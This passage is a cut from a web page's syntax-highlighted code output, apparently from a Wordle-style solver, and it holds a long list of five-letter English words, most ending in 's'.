class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Q</span> [(<span class="string">&#x27;a3&#x27;</span>, <span class="number">486</span>), (<span class="string">&#x27;s1&#x27;</span>, <span class="number">563</span>), (<span class="string">&#x27;a2&#x27;</span>, <span class="number">689</span>), (<span class="string">&#x27;e4&#x27;</span>, <span class="number">793</span>), (<span class="string">&#x27;s5&#x27;</span>, <span class="number">1033</span>)]</span><br><span class="line">[<span class="string">&#x27;floss&#x27;</span>, <span class="string">&#x27;crass&#x27;</span>, <span class="string">&#x27;abyss&#x27;</span>, <span class="string">&#x27;rebus&#x27;</span>, <span class="string">&#x27;truss&#x27;</span>, <span class="string">&#x27;focus&#x27;</span>, <span class="string">&#x27;fetus&#x27;</span>, <span class="string">&#x27;glass&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;chaos&#x27;</span>, <span class="string">&#x27;dross&#x27;</span>, <span class="string">&#x27;cress&#x27;</span>, <span class="string">&#x27;bless&#x27;</span>, <span class="string">&#x27;bliss&#x27;</span>, <span class="string">&#x27;brass&#x27;</span>, <span class="string">&#x27;cross&#x27;</span>, <span class="string">&#x27;amass&#x27;</span>, <span class="string">&#x27;bonus&#x27;</span>, <span class="string">&#x27;locus&#x27;</span>, <span class="string">&#x27;grass&#x27;</span>, <span class="string">&#x27;ethos&#x27;</span>, <span class="string">&#x27;humus&#x27;</span>, <span class="string">&#x27;basis&#x27;</span>, <span class="string">&#x27;guess&#x27;</span>, <span class="string">&#x27;lupus&#x27;</span>, <span class="string">&#x27;torus&#x27;</span>, <span class="string">&#x27;minus&#x27;</span>, <span class="string">&#x27;dress&#x27;</span>, <span class="string">&#x27;amiss&#x27;</span>, <span class="string">&#x27;mucus&#x27;</span>, <span class="string">&#x27;gross&#x27;</span>, <span class="string">&#x27;gloss&#x27;</span>, <span class="string">&#x27;virus&#x27;</span>, <span class="string">&#x27;chess&#x27;</span>, <span class="string">&#x27;ficus&#x27;</span>, <span class="string">&#x27;press&#x27;</span>, <span class="string">&#x27;years&#x27;</span>, <span class="string">&#x27;words&#x27;</span>, <span class="string">&#x27;hands&#x27;</span>, <span class="string">&#x27;works&#x27;</span>, <span class="string">&#x27;means&#x27;</span>, <span class="string">&#x27;times&#x27;</span>, <span class="string">&#x27;terms&#x27;</span>, <span class="string">&#x27;seems&#x27;</span>, <span class="string">&#x27;miles&#x27;</span>, <span class="string">&#x27;comes&#x27;</span>, <span class="string">&#x27;hours&#x27;</span>, <span class="string">&#x27;makes&#x27;</span>, <span class="string">&#x27;books&#x27;</span>, <span class="string">&#x27;knows&#x27;</span>, <span class="string">&#x27;trees&#x27;</span>, <span class="string">&#x27;parts&#x27;</span>, <span class="string">&#x27;tears&#x27;</span>, <span class="string">&#x27;lines&#x27;</span>, <span class="string">&#x27;takes&#x27;</span>, <span class="string">&#x27;girls&#x27;</span>, <span class="string">&#x27;gives&#x27;</span>, <span class="string">&#x27;lives&#x27;</span>, <span class="string">&#x27;looks&#x27;</span>, <span class="string">&#x27;walls&#x27;</span>, <span class="string">&#x27;steps&#x27;</span>, <span class="string">&#x27;cases&#x27;</span>, <span class="string">&#x27;names&#x27;</span>, <span class="string">&#x27;forms&#x27;</span>, <span class="string">&#x27;heads&#x27;</span>, <span class="string">&#x27;ideas&#x27;</span>, <span class="string">&#x27;ships&#x27;</span>, <span class="string">&#x27;weeks&#x27;</span>, <span class="string">&#x27;sides&#x27;</span>, <span class="string">&#x27;facts&#x27;</span>, <span class="string">&#x27;hills&#x27;</span>, <span class="string">&#x27;faces&#x27;</span>, <span class="string">&#x27;birds&#x27;</span>, <span class="string">&#x27;tells&#x27;</span>, <span class="string">&#x27;rules&#x27;</span>, <span class="string">&#x27;wants&#x27;</span>, <span class="string">&#x27;hopes&#x27;</span>, <span class="string">&#x27;woods&#x27;</span>, <span class="string">&#x27;minds&#x27;</span>, <span class="string">&#x27;yours&#x27;</span>, <span class="string">&#x27;shows&#x27;</span>, <span class="string">&#x27;rocks&#x27;</span>, <span class="string">&#x27;notes&#x27;</span>, <span class="string">&#x27;needs&#x27;</span>, <span class="string">&#x27;lands&#x27;</span>, <span class="string">&#x27;stars&#x27;</span>, <span class="string">&#x27;rooms&#x27;</span>, <span class="string">&#x27;knees&#x27;</span>, <span class="string">&#x27;doors&#x27;</span>, <span class="string">&#x27;goods&#x27;</span>, <span class="string">&#x27;yards&#x27;</span>, <span class="string">&#x27;temps&#x27;</span>, <span class="string">&#x27;souls&#x27;</span>, <span class="string">&#x27;calls&#x27;</span>, <span class="string">&#x27;plans&#x27;</span>, <span class="string">&#x27;pages&#x27;</span>, <span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;signs&#x27;</span>, <span class="string">&#x27;kinds&#x27;</span>, <span class="string">&#x27;kings&#x27;</span>, <span class="string">&#x27;links&#x27;</span>, <span class="string">&#x27;files&#x27;</span>, <span class="string">&#x27;banks&#x27;</span>, <span class="string">&#x27;loves&#x27;</span>, <span class="string">&#x27;wings&#x27;</span>, <span class="string">&#x27;turns&#x27;</span>, <span class="string">&#x27;waves&#x27;</span>, <span class="string">&#x27;towns&#x27;</span>, <span class="string">&#x27;corps&#x27;</span>, <span class="string">&#x27;finds&#x27;</span>, <span class="string">&#x27;costs&#x27;</span>, <span class="string">&#x27;boats&#x27;</span>, <span class="string">&#x27;cries&#x27;</span>, <span class="string">&#x27;sorts&#x27;</span>, <span class="string">&#x27;falls&#x27;</span>, <span class="string">&#x27;gates&#x27;</span>, <span class="string">&#x27;bones&#x27;</span>, <span class="string">&#x27;trois&#x27;</span>, <span class="string">&#x27;winds&#x27;</span>, <span class="string">&#x27;fears&#x27;</span>, <span class="string">&#x27;wives&#x27;</span>, <span class="string">&#x27;holds&#x27;</span>, <span class="string">&#x27;roads&#x27;</span>, <span class="string">&#x27;gifts&#x27;</span>, <span class="string">&#x27;marks&#x27;</span>, <span class="string">&#x27;pains&#x27;</span>, <span class="string">&#x27;walks&#x27;</span>, <span class="string">&#x27;folks&#x27;</span>, <span class="string">&#x27;poets&#x27;</span>, <span class="string">&#x27;shoes&#x27;</span>, <span class="string">&#x27;deeds&#x27;</span>, <span class="string">&#x27;bears&#x27;</span>, <span class="string">&#x27;feels&#x27;</span>, <span class="string">&#x27;poems&#x27;</span>, <span class="string">&#x27;plays&#x27;</span>, <span class="string">&#x27;keeps&#x27;</span>, <span class="string">&#x27;songs&#x27;</span>, <span class="string">&#x27;leads&#x27;</span>, <span class="string">&#x27;limbs&#x27;</span>, <span class="string">&#x27;tones&#x27;</span>, <span class="string">&#x27;grows&#x27;</span>, <span class="string">&#x27;ranks&#x27;</span>, <span class="string">&#x27;tales&#x27;</span>, <span class="string">&#x27;boots&#x27;</span>, <span class="string">&#x27;seats&#x27;</span>, <span class="string">&#x27;fires&#x27;</span>, <span class="string">&#x27;jours&#x27;</span>, <span class="string">&#x27;cents&#x27;</span>, <span class="string">&#x27;roses&#x27;</span>, <span class="string">&#x27;roots&#x27;</span>, <span class="string">&#x27;pious&#x27;</span>, <span class="string">&#x27;wages&#x27;</span>, <span class="string">&#x27;blows&#x27;</span>, <span class="string">&#x27;cares&#x27;</span>, <span class="string">&#x27;rises&#x27;</span>, <span class="string">&#x27;ruins&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;lords&#x27;</span>, <span class="string">&#x27;dates&#x27;</span>, <span class="string">&#x27;homes&#x27;</span>, <span class="string">&#x27;drops&#x27;</span>, <span class="string">&#x27;likes&#x27;</span>, <span class="string">&#x27;cards&#x27;</span>, <span class="string">&#x27;races&#x27;</span>, <span class="string">&#x27;codes&#x27;</span>, <span class="string">&#x27;taxes&#x27;</span>, <span class="string">&#x27;ashes&#x27;</span>, <span class="string">&#x27;bells&#x27;</span>, <span class="string">&#x27;heels&#x27;</span>, <span class="string">&#x27;evils&#x27;</span>, <span class="string">&#x27;bands&#x27;</span>, <span class="string">&#x27;acres&#x27;</span>, <span class="string">&#x27;mains&#x27;</span>, <span class="string">&#x27;flies&#x27;</span>, <span class="string">&#x27;seeds&#x27;</span>, <span class="string">&#x27;sites&#x27;</span>, <span class="string">&#x27;bills&#x27;</span>, <span class="string">&#x27;holes&#x27;</span>, <span class="string">&#x27;sails&#x27;</span>, <span class="string">&#x27;rings&#x27;</span>, <span class="string">&#x27;boxes&#x27;</span>, <span class="string">&#x27;fools&#x27;</span>, <span class="string">&#x27;veins&#x27;</span>, <span class="string">&#x27;opens&#x27;</span>, <span class="string">&#x27;sends&#x27;</span>, <span class="string">&#x27;mines&#x27;</span>, <span class="string">&#x27;paths&#x27;</span>, <span class="string">&#x27;moves&#x27;</span>, <span class="string">&#x27;shops&#x27;</span>, <span class="string">&#x27;tents&#x27;</span>, <span class="string">&#x27;backs&#x27;</span>, <span class="string">&#x27;bonds&#x27;</span>, <span class="string">&#x27;games&#x27;</span>, <span class="string">&#x27;debts&#x27;</span>, <span class="string">&#x27;spots&#x27;</span>, <span class="string">&#x27;balls&#x27;</span>, <span class="string">&#x27;crops&#x27;</span>, <span class="string">&#x27;monks&#x27;</span>, <span class="string">&#x27;lamps&#x27;</span>, <span class="string">&#x27;hears&#x27;</span>, <span class="string">&#x27;robes&#x27;</span>, <span class="string">&#x27;skies&#x27;</span>, <span class="string">&#x27;draws&#x27;</span>, <span class="string">&#x27;votes&#x27;</span>, <span class="string">&#x27;rests&#x27;</span>, <span class="string">&#x27;brows&#x27;</span>, <span class="string">&#x27;reads&#x27;</span>, <span class="string">&#x27;talks&#x27;</span>, <span class="string">&#x27;horns&#x27;</span>, <span class="string">&#x27;apres&#x27;</span>, <span class="string">&#x27;texts&#x27;</span>, <span class="string">&#x27;genus&#x27;</span>, <span class="string">&#x27;locks&#x27;</span>, <span class="string">&#x27;posts&#x27;</span>, <span class="string">&#x27;funds&#x27;</span>, <span class="string">&#x27;tools&#x27;</span>, <span class="string">&#x27;paces&#x27;</span>, <span class="string">&#x27;fails&#x27;</span>, <span class="string">&#x27;ports&#x27;</span>, <span class="string">&#x27;rates&#x27;</span>, <span class="string">&#x27;vices&#x27;</span>, <span class="string">&#x27;wears&#x27;</span>, <span class="string">&#x27;skins&#x27;</span>, <span class="string">&#x27;items&#x27;</span>, <span class="string">&#x27;seeks&#x27;</span>, <span class="string">&#x27;lakes&#x27;</span>, <span class="string">&#x27;sales&#x27;</span>, <span class="string">&#x27;meets&#x27;</span>, <span class="string">&#x27;meals&#x27;</span>, <span class="string">&#x27;suits&#x27;</span>, <span class="string">&#x27;flows&#x27;</span>, <span class="string">&#x27;reeds&#x27;</span>, <span class="string">&#x27;roofs&#x27;</span>, <span class="string">&#x27;beams&#x27;</span>, <span class="string">&#x27;cells&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;folds&#x27;</span>, <span class="string">&#x27;maids&#x27;</span>, <span class="string">&#x27;mules&#x27;</span>, <span class="string">&#x27;reins&#x27;</span>, <span class="string">&#x27;edges&#x27;</span>, <span class="string">&#x27;nails&#x27;</span>, <span class="string">&#x27;tries&#x27;</span>, <span class="string">&#x27;cakes&#x27;</span>, <span class="string">&#x27;rites&#x27;</span>, <span class="string">&#x27;sings&#x27;</span>, <span class="string">&#x27;hosts&#x27;</span>, <span class="string">&#x27;hangs&#x27;</span>, <span class="string">&#x27;coats&#x27;</span>, <span class="string">&#x27;goals&#x27;</span>, <span class="string">&#x27;modes&#x27;</span>, <span class="string">&#x27;loses&#x27;</span>, <span class="string">&#x27;pines&#x27;</span>, <span class="string">&#x27;heaps&#x27;</span>, <span class="string">&#x27;fills&#x27;</span>, <span class="string">&#x27;forts&#x27;</span>, <span class="string">&#x27;lions&#x27;</span>, <span class="string">&#x27;lungs&#x27;</span>, <span class="string">&#x27;sands&#x27;</span>, <span class="string">&#x27;halls&#x27;</span>, <span class="string">&#x27;farms&#x27;</span>, <span class="string">&#x27;rains&#x27;</span>, <span class="string">&#x27;hints&#x27;</span>, <span class="string">&#x27;poles&#x27;</span>, <span class="string">&#x27;ropes&#x27;</span>, <span class="string">&#x27;rolls&#x27;</span>, <span class="string">&#x27;males&#x27;</span>, <span class="string">&#x27;shots&#x27;</span>, <span class="string">&#x27;stops&#x27;</span>, <span class="string">&#x27;clubs&#x27;</span>, <span class="string">&#x27;lists&#x27;</span>, <span class="string">&#x27;flags&#x27;</span>, <span class="string">&#x27;curls&#x27;</span>, <span class="string">&#x27;weeds&#x27;</span>, <span class="string">&#x27;tends&#x27;</span>, <span class="string">&#x27;palms&#x27;</span>, <span class="string">&#x27;sexes&#x27;</span>, <span class="string">&#x27;users&#x27;</span>, <span class="string">&#x27;oaths&#x27;</span>, <span class="string">&#x27;beads&#x27;</span>, <span class="string">&#x27;herds&#x27;</span>, <span class="string">&#x27;vines&#x27;</span>, <span class="string">&#x27;sighs&#x27;</span>, <span class="string">&#x27;helps&#x27;</span>, <span class="string">&#x27;peaks&#x27;</span>, <span class="string">&#x27;coins&#x27;</span>, <span class="string">&#x27;hoofs&#x27;</span>, <span class="string">&#x27;pairs&#x27;</span>, <span class="string">&#x27;beans&#x27;</span>, <span class="string">&#x27;coups&#x27;</span>, <span class="string">&#x27;goats&#x27;</span>, <span class="string">&#x27;spurs&#x27;</span>, <span class="string">&#x27;gains&#x27;</span>, <span class="string">&#x27;moods&#x27;</span>, <span class="string">&#x27;spies&#x27;</span>, <span class="string">&#x27;hymns&#x27;</span>, <span class="string">&#x27;fowls&#x27;</span>, <span class="string">&#x27;burns&#x27;</span>, <span class="string">&#x27;mills&#x27;</span>, <span class="string">&#x27;tails&#x27;</span>, <span class="string">&#x27;mists&#x27;</span>, <span class="string">&#x27;ducks&#x27;</span>, <span class="string">&#x27;waits&#x27;</span>, <span class="string">&#x27;caves&#x27;</span>, <span class="string">&#x27;tasks&#x27;</span>, <span class="string">&#x27;claws&#x27;</span>, <span class="string">&#x27;twins&#x27;</span>, <span class="string">&#x27;idols&#x27;</span>, <span class="string">&#x27;wills&#x27;</span>, <span class="string">&#x27;dares&#x27;</span>, <span class="string">&#x27;sizes&#x27;</span>, <span class="string">&#x27;risks&#x27;</span>, <span class="string">&#x27;stems&#x27;</span>, <span class="string">&#x27;tests&#x27;</span>, <span class="string">&#x27;seals&#x27;</span>, <span class="string">&#x27;sinks&#x27;</span>, <span class="string">&#x27;carts&#x27;</span>, <span class="string">&#x27;deals&#x27;</span>, <span class="string">&#x27;noses&#x27;</span>, <span class="string">&#x27;knots&#x27;</span>, <span class="string">&#x27;areas&#x27;</span>, <span class="string">&#x27;fists&#x27;</span>, <span class="string">&#x27;plots&#x27;</span>, <span class="string">&#x27;drugs&#x27;</span>, <span class="string">&#x27;wines&#x27;</span>, <span class="string">&#x27;pools&#x27;</span>, <span class="string">&#x27;cords&#x27;</span>, <span class="string">&#x27;rails&#x27;</span>, <span class="string">&#x27;stays&#x27;</span>, <span class="string">&#x27;kills&#x27;</span>, <span class="string">&#x27;lifts&#x27;</span>, <span class="string">&#x27;worms&#x27;</span>, <span class="string">&#x27;masts&#x27;</span>, <span class="string">&#x27;decks&#x27;</span>, <span class="string">&#x27;pangs&#x27;</span>, <span class="string">&#x27;toils&#x27;</span>, <span class="string">&#x27;loads&#x27;</span>, <span class="string">&#x27;peers&#x27;</span>, <span class="string">&#x27;longs&#x27;</span>, <span class="string">&#x27;baths&#x27;</span>, <span class="string">&#x27;tides&#x27;</span>, <span class="string">&#x27;tints&#x27;</span>, <span class="string">&#x27;atoms&#x27;</span>, <span class="string">&#x27;wares&#x27;</span>, <span class="string">&#x27;slips&#x27;</span>, <span class="string">&#x27;rents&#x27;</span>, <span class="string">&#x27;feats&#x27;</span>, <span class="string">&#x27;twigs&#x27;</span>, <span class="string">&#x27;lasts&#x27;</span>, <span class="string">&#x27;casts&#x27;</span>, <span class="string">&#x27;snows&#x27;</span>, <span class="string">&#x27;sects&#x27;</span>, <span class="string">&#x27;cours&#x27;</span>, <span class="string">&#x27;lanes&#x27;</span>, <span class="string">&#x27;wells&#x27;</span>, <span class="string">&#x27;joins&#x27;</span>, <span class="string">&#x27;bases&#x27;</span>, <span class="string">&#x27;vases&#x27;</span>, <span class="string">&#x27;chaps&#x27;</span>, <span class="string">&#x27;bolts&#x27;</span>, <span class="string">&#x27;irons&#x27;</span>, <span class="string">&#x27;lambs&#x27;</span>, <span class="string">&#x27;leaps&#x27;</span>, <span class="string">&#x27;gowns&#x27;</span>, <span class="string">&#x27;sages&#x27;</span>, <span class="string">&#x27;bends&#x27;</span>, <span class="string">&#x27;hurts&#x27;</span>, <span class="string">&#x27;silks&#x27;</span>, <span class="string">&#x27;crews&#x27;</span>, <span class="string">&#x27;bulls&#x27;</span>, <span class="string">&#x27;lacks&#x27;</span>, <span class="string">&#x27;verbs&#x27;</span>, <span class="string">&#x27;traps&#x27;</span>, <span class="string">&#x27;mates&#x27;</span>, <span class="string">&#x27;meats&#x27;</span>, <span class="string">&#x27;feeds&#x27;</span>, <span class="string">&#x27;darts&#x27;</span>, <span class="string">&#x27;flats&#x27;</span>, <span class="string">&#x27;tubes&#x27;</span>, <span class="string">&#x27;units&#x27;</span>, <span class="string">&#x27;pours&#x27;</span>, <span class="string">&#x27;trips&#x27;</span>, <span class="string">&#x27;antes&#x27;</span>, <span class="string">&#x27;yells&#x27;</span>, <span class="string">&#x27;hooks&#x27;</span>, <span class="string">&#x27;nouns&#x27;</span>, <span class="string">&#x27;louis&#x27;</span>, <span class="string">&#x27;ferns&#x27;</span>, <span class="string">&#x27;fumes&#x27;</span>, <span class="string">&#x27;sheds&#x27;</span>, <span class="string">&#x27;foods&#x27;</span>, <span class="string">&#x27;isles&#x27;</span>, <span class="string">&#x27;saves&#x27;</span>, <span class="string">&#x27;forks&#x27;</span>, <span class="string">&#x27;dites&#x27;</span>, <span class="string">&#x27;teams&#x27;</span>, <span class="string">&#x27;cooks&#x27;</span>, <span class="string">&#x27;deres&#x27;</span>, <span class="string">&#x27;sacks&#x27;</span>, <span class="string">&#x27;frogs&#x27;</span>, <span class="string">&#x27;wakes&#x27;</span>, <span class="string">&#x27;reefs&#x27;</span>, <span class="string">&#x27;asses&#x27;</span>, <span class="string">&#x27;loans&#x27;</span>, <span class="string">&#x27;binds&#x27;</span>, <span class="string">&#x27;germs&#x27;</span>, <span class="string">&#x27;fines&#x27;</span>, <span class="string">&#x27;crows&#x27;</span>, <span class="string">&#x27;salts&#x27;</span>, <span class="string">&#x27;bowls&#x27;</span>, <span class="string">&#x27;jests&#x27;</span>, <span class="string">&#x27;sells&#x27;</span>, <span class="string">&#x27;downs&#x27;</span>, <span class="string">&#x27;babes&#x27;</span>, <span class="string">&#x27;dents&#x27;</span>, <span class="string">&#x27;panes&#x27;</span>, <span class="string">&#x27;wilds&#x27;</span>, <span class="string">&#x27;yolks&#x27;</span>, <span class="string">&#x27;loins&#x27;</span>, <span class="string">&#x27;stirs&#x27;</span>, <span class="string">&#x27;veils&#x27;</span>, <span class="string">&#x27;tunes&#x27;</span>, <span class="string">&#x27;lumps&#x27;</span>, <span class="string">&#x27;repos&#x27;</span>, <span class="string">&#x27;sakes&#x27;</span>, <span class="string">&#x27;pulls&#x27;</span>, <span class="string">&#x27;tiles&#x27;</span>, <span class="string">&#x27;barns&#x27;</span>, <span class="string">&#x27;aunts&#x27;</span>, <span class="string">&#x27;crags&#x27;</span>, <span class="string">&#x27;casks&#x27;</span>, <span class="string">&#x27;cures&#x27;</span>, <span class="string">&#x27;alias&#x27;</span>, <span class="string">&#x27;noirs&#x27;</span>, <span class="string">&#x27;scars&#x27;</span>, <span class="string">&#x27;morts&#x27;</span>, <span class="string">&#x27;ponds&#x27;</span>, <span class="string">&#x27;bales&#x27;</span>, <span class="string">&#x27;gales&#x27;</span>, <span class="string">&#x27;lends&#x27;</span>, <span class="string">&#x27;foxes&#x27;</span>, <span class="string">&#x27;picks&#x27;</span>, <span class="string">&#x27;urges&#x27;</span>, <span class="string">&#x27;shuts&#x27;</span>, <span class="string">&#x27;socks&#x27;</span>, <span class="string">&#x27;parks&#x27;</span>, <span class="string">&#x27;odors&#x27;</span>, <span class="string">&#x27;gases&#x27;</span>, <span class="string">&#x27;lawns&#x27;</span>, <span class="string">&#x27;tufts&#x27;</span>, <span class="string">&#x27;fixes&#x27;</span>, <span class="string">&#x27;soles&#x27;</span>, <span class="string">&#x27;gusts&#x27;</span>, <span class="string">&#x27;coils&#x27;</span>, <span class="string">&#x27;masks&#x27;</span>, <span class="string">&#x27;packs&#x27;</span>, <span class="string">&#x27;doves&#x27;</span>, <span class="string">&#x27;dolls&#x27;</span>, <span class="string">&#x27;wards&#x27;</span>, <span class="string">&#x27;puffs&#x27;</span>, <span class="string">&#x27;dukes&#x27;</span>, <span class="string">&#x27;shews&#x27;</span>, <span class="string">&#x27;myths&#x27;</span>, <span class="string">&#x27;fangs&#x27;</span>, <span class="string">&#x27;belts&#x27;</span>, <span class="string">&#x27;idees&#x27;</span>, <span class="string">&#x27;slabs&#x27;</span>, <span class="string">&#x27;fates&#x27;</span>, <span class="string">&#x27;chefs&#x27;</span>, <span class="string">&#x27;moons&#x27;</span>, <span class="string">&#x27;prays&#x27;</span>, <span class="string">&#x27;leans&#x27;</span>, <span class="string">&#x27;eaves&#x27;</span>, <span class="string">&#x27;whims&#x27;</span>, <span class="string">&#x27;whips&#x27;</span>, <span class="string">&#x27;manos&#x27;</span>, <span class="string">&#x27;chips&#x27;</span>, <span class="string">&#x27;domes&#x27;</span>, <span class="string">&#x27;wraps&#x27;</span>, <span class="string">&#x27;pumps&#x27;</span>, <span class="string">&#x27;dregs&#x27;</span>, <span class="string">&#x27;jumps&#x27;</span>, <span class="string">&#x27;wiles&#x27;</span>, <span class="string">&#x27;roars&#x27;</span>, <span class="string">&#x27;soils&#x27;</span>, <span class="string">&#x27;raids&#x27;</span>, <span class="string">&#x27;acids&#x27;</span>, <span class="string">&#x27;tiers&#x27;</span>, <span class="string">&#x27;tanks&#x27;</span>, <span class="string">&#x27;canes&#x27;</span>, <span class="string">&#x27;bombs&#x27;</span>, <span class="string">&#x27;stets&#x27;</span>, <span class="string">&#x27;spars&#x27;</span>, <span class="string">&#x27;pears&#x27;</span>, <span class="string">&#x27;swans&#x27;</span>, <span class="string">&#x27;tours&#x27;</span>, <span class="string">&#x27;omens&#x27;</span>, <span class="string">&#x27;cocks&#x27;</span>, <span class="string">&#x27;pesos&#x27;</span>, <span class="string">&#x27;clans&#x27;</span>, <span class="string">&#x27;melts&#x27;</span>, <span class="string">&#x27;bards&#x27;</span>, <span class="string">&#x27;moths&#x27;</span>, <span class="string">&#x27;deeps&#x27;</span>, <span class="string">&#x27;dears&#x27;</span>, <span class="string">&#x27;plums&#x27;</span>, <span class="string">&#x27;hawks&#x27;</span>, <span class="string">&#x27;moors&#x27;</span>, <span class="string">&#x27;bites&#x27;</span>, <span class="string">&#x27;docks&#x27;</span>, <span class="string">&#x27;serfs&#x27;</span>, <span class="string">&#x27;oasis&#x27;</span>, <span class="string">&#x27;laces&#x27;</span>, <span class="string">&#x27;fades&#x27;</span>, <span class="string">&#x27;weeps&#x27;</span>, <span class="string">&#x27;lusts&#x27;</span>, <span class="string">&#x27;glows&#x27;</span>, <span class="string">&#x27;pikes&#x27;</span>, <span class="string">&#x27;chums&#x27;</span>, <span class="string">&#x27;lotus&#x27;</span>, <span class="string">&#x27;cuffs&#x27;</span>, <span class="string">&#x27;barks&#x27;</span>, <span class="string">&#x27;tires&#x27;</span>, <span class="string">&#x27;teils&#x27;</span>, <span class="string">&#x27;doses&#x27;</span>, <span class="string">&#x27;cages&#x27;</span>, <span class="string">&#x27;fours&#x27;</span>, <span class="string">&#x27;feuds&#x27;</span>, <span class="string">&#x27;gangs&#x27;</span>, <span class="string">&#x27;pills&#x27;</span>, <span class="string">&#x27;pants&#x27;</span>, <span class="string">&#x27;hares&#x27;</span>, <span class="string">&#x27;riots&#x27;</span>, <span class="string">&#x27;kicks&#x27;</span>, <span class="string">&#x27;looms&#x27;</span>, <span class="string">&#x27;piers&#x27;</span>, <span class="string">&#x27;seams&#x27;</span>, <span class="string">&#x27;mails&#x27;</span>, <span class="string">&#x27;moans&#x27;</span>, <span class="string">&#x27;drags&#x27;</span>, <span class="string">&#x27;tusks&#x27;</span>, <span class="string">&#x27;cones&#x27;</span>, <span class="string">&#x27;boils&#x27;</span>, <span class="string">&#x27;crabs&#x27;</span>, <span class="string">&#x27;warns&#x27;</span>, <span class="string">&#x27;aches&#x27;</span>, <span class="string">&#x27;gazes&#x27;</span>, <span class="string">&#x27;heats&#x27;</span>, <span class="string">&#x27;howls&#x27;</span>, <span class="string">&#x27;memes&#x27;</span>, <span class="string">&#x27;peals&#x27;</span>, <span class="string">&#x27;bords&#x27;</span>, <span class="string">&#x27;firms&#x27;</span>, <span class="string">&#x27;fares&#x27;</span>, <span class="string">&#x27;bulbs&#x27;</span>, <span class="string">&#x27;pints&#x27;</span>, <span class="string">&#x27;popes&#x27;</span>, <span class="string">&#x27;quits&#x27;</span>, <span class="string">&#x27;chops&#x27;</span>, <span class="string">&#x27;pores&#x27;</span>, <span class="string">&#x27;rares&#x27;</span>, <span class="string">&#x27;zones&#x27;</span>, <span class="string">&#x27;liars&#x27;</span>, <span class="string">&#x27;mares&#x27;</span>, <span class="string">&#x27;omits&#x27;</span>, <span class="string">&#x27;cites&#x27;</span>, <span class="string">&#x27;earls&#x27;</span>, <span class="string">&#x27;tongs&#x27;</span>, <span class="string">&#x27;vales&#x27;</span>, <span class="string">&#x27;nooks&#x27;</span>, <span class="string">&#x27;busts&#x27;</span>, <span class="string">&#x27;fetes&#x27;</span>, <span class="string">&#x27;venus&#x27;</span>, <span class="string">&#x27;larks&#x27;</span>, <span class="string">&#x27;gulls&#x27;</span>, <span class="string">&#x27;duels&#x27;</span>, <span class="string">&#x27;hoops&#x27;</span>, <span class="string">&#x27;warms&#x27;</span>, <span class="string">&#x27;obeys&#x27;</span>, <span class="string">&#x27;harps&#x27;</span>, <span class="string">&#x27;tapis&#x27;</span>, <span class="string">&#x27;fairs&#x27;</span>, <span class="string">&#x27;rafts&#x27;</span>, <span class="string">&#x27;cotes&#x27;</span>, <span class="string">&#x27;plats&#x27;</span>, <span class="string">&#x27;rages&#x27;</span>, <span class="string">&#x27;hunts&#x27;</span>, <span class="string">&#x27;loops&#x27;</span>, <span class="string">&#x27;manes&#x27;</span>, <span class="string">&#x27;pails&#x27;</span>, <span class="string">&#x27;desks&#x27;</span>, <span class="string">&#x27;horas&#x27;</span>, <span class="string">&#x27;deems&#x27;</span>, <span class="string">&#x27;sores&#x27;</span>, <span class="string">&#x27;sofas&#x27;</span>, <span class="string">&#x27;trays&#x27;</span>, <span class="string">&#x27;lurks&#x27;</span>, <span class="string">&#x27;quays&#x27;</span>, <span class="string">&#x27;rooks&#x27;</span>, <span class="string">&#x27;bores&#x27;</span>, <span class="string">&#x27;reels&#x27;</span>, <span class="string">&#x27;vents&#x27;</span>, <span class="string">&#x27;slums&#x27;</span>, <span class="string">&#x27;mazes&#x27;</span>, <span class="string">&#x27;blues&#x27;</span>, <span class="string">&#x27;sires&#x27;</span>, <span class="string">&#x27;yarns&#x27;</span>, <span class="string">&#x27;swims&#x27;</span>, <span class="string">&#x27;husks&#x27;</span>, <span class="string">&#x27;combs&#x27;</span>, <span class="string">&#x27;dupes&#x27;</span>, <span class="string">&#x27;dunes&#x27;</span>, <span class="string">&#x27;rangs&#x27;</span>, <span class="string">&#x27;cafes&#x27;</span>, <span class="string">&#x27;gills&#x27;</span>, <span class="string">&#x27;halts&#x27;</span>, <span class="string">&#x27;fonds&#x27;</span>, <span class="string">&#x27;sechs&#x27;</span>, <span class="string">&#x27;soups&#x27;</span>, <span class="string">&#x27;glens&#x27;</span>, <span class="string">&#x27;jeers&#x27;</span>, <span class="string">&#x27;pleas&#x27;</span>, <span class="string">&#x27;earns&#x27;</span>, <span class="string">&#x27;camps&#x27;</span>, <span class="string">&#x27;coals&#x27;</span>, <span class="string">&#x27;rills&#x27;</span>, <span class="string">&#x27;gasps&#x27;</span>, <span class="string">&#x27;capes&#x27;</span>, <span class="string">&#x27;calms&#x27;</span>, <span class="string">&#x27;fleas&#x27;</span>, <span class="string">&#x27;polls&#x27;</span>, <span class="string">&#x27;beets&#x27;</span>, <span class="string">&#x27;gulfs&#x27;</span>, <span class="string">&#x27;rends&#x27;</span>, <span class="string">&#x27;thans&#x27;</span>, <span class="string">&#x27;soars&#x27;</span>, <span class="string">&#x27;writs&#x27;</span>, <span class="string">&#x27;mocks&#x27;</span>, <span class="string">&#x27;elves&#x27;</span>, <span class="string">&#x27;disks&#x27;</span>, <span class="string">&#x27;dries&#x27;</span>, <span class="string">&#x27;beaks&#x27;</span>, <span class="string">&#x27;toads&#x27;</span>, <span class="string">&#x27;grips&#x27;</span>, <span class="string">&#x27;vives&#x27;</span>, <span class="string">&#x27;films&#x27;</span>, <span class="string">&#x27;jerks&#x27;</span>, <span class="string">&#x27;fasts&#x27;</span>, <span class="string">&#x27;dawns&#x27;</span>, <span class="string">&#x27;voces&#x27;</span>, <span class="string">&#x27;sways&#x27;</span>, <span class="string">&#x27;spits&#x27;</span>, <span class="string">&#x27;dykes&#x27;</span>, <span class="string">&#x27;tolls&#x27;</span>, <span class="string">&#x27;kites&#x27;</span>, <span class="string">&#x27;props&#x27;</span>, <span 